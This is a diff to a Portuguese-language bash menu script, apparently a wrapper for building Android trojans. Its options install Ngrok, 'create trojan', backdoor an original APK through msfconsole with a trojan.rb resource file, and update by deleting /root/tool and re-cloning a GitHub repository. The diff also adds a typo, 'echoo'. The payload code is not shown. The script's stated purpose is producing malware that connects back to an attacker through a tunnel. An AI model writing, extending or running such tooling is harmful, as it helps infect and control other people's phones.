@@ -1,5 +1,6 @@
 #!/bin/bash
 clear
+verde="\033[42;1;37m \033[0m  "
 echo "dependencias necessarias
 default-jdk zipalign apktool "
 echo "Instala dependencias [s/n]?"
@@ -17,8 +18,10 @@ clear
 echo "1-Instala Ngrok"
 echo "2-Cria trojan"
 echo "3-Cria trojan 'apk-original' "
-echo "4-Update \n"
-echo -n "Escolha uma opcao? \n"
+echo "4-Update "
+echoo ""
+echo -n "Escolha uma opcao? "
+echo ""
 read resp1
 
 if [ "$resp1" = "1" ]
@@ -51,9 +54,10 @@ msfconsole -r trojan.rb
 fi
 if [ "$resp1" = "4" ]
 then
+cd /root && rm -r tool
 git clone https://github.com/noobfoda2/tool
 echo " "
-echo "\033[42;1;37m \033[0m update success "
+echo "$verde update success "
 fi
 }
 menu
